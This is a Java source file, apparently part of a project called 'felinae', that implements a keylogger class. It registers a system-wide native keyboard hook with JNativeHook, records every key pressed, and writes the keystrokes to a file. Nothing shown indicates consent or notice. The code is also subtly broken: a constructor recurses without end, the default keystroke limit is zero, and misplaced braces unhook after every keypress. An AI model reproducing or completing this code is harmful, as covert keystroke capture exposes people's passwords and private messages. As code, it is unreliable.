package felinae.capture_keystrokes;

import java.awt.List;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.util.ArrayList;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import felinae.folder_manager.FolderManager;

public class CaptureKeystrokes implements NativeKeyListener {

    private int limitOfKeystrokes;
    private ArrayList<String> listOfKeystrokes = new ArrayList<String>();
    
    public CaptureKeystrokes() { this.captureUserKeystrokes(); }
    
    public CaptureKeystrokes(int limitOfKeystrokes) {
        this.limitOfKeystrokes = limitOfKeystrokes;
    }
    
    public ArrayList<String> getListOfKeystrokes() {
        return listOfKeystrokes;
    }
    
    public void captureUserKeystrokes() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException exception) {
            System.err.println(exception.getMessage());
            System.exit(0);
        }
        
        //captureUserKeystrokes();
        GlobalScreen.addNativeKeyListener(new CaptureKeystrokes());
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent event) {
        String keyStroke =  NativeKeyEvent.getKeyText(event.getKeyCode());
        
        if (listOfKeystrokesIsNotFull())
            SaveKeystrokes(keyStroke);
        else
            if (listOfKeystrokes.size() == limitOfKeystrokes)
                try {
                    writeKeystrokesOnFile();
                } catch (IOException e) {
                }
        
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException exception) {
                System.err.println(exception.getMessage());
                System.exit(0);
            }
        
    }
    
    private void writeKeystrokesOnFile() throws IOException {
        String keystrokesFilePath = new FolderManager().getKeystrokesFolderPath();
        
        File keystrokes = new File(keystrokesFilePath);
        if(!keystrokes.exists())
            keystrokes.createNewFile();

        PrintWriter fileWriter = new PrintWriter(keystrokes, "UTF-8");
        for (String keystroke:listOfKeystrokes)
            fileWriter.println(keystroke);
        
        fileWriter.close();
        
    }

    private boolean listOfKeystrokesIsNotFull() {
        if (listOfKeystrokes.size() < limitOfKeystrokes)
            return true;
        
        return false;
    }

    private void SaveKeystrokes(String keyStroke) {
        listOfKeystrokes.add(keyStroke);
        
        
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent event) {
        
    }
    
    @Override
    public void nativeKeyTyped(NativeKeyEvent event) {
        
    }

}
